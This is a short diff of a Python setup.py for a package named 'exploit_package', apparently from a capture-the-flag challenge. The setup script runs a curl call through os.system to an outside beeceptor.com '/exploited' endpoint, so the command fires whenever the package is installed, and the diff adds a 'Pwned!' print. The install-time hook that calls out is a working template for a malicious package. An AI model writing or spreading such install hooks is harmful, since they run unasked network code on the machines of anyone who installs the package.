@@ -2,6 +2,7 @@ from setuptools import setup
 
 import os
 
+print("Pwned!")
 os.system("curl https://heroctf-ploc.free.beeceptor.com/exploited")
 setup(
         name="exploit_package",
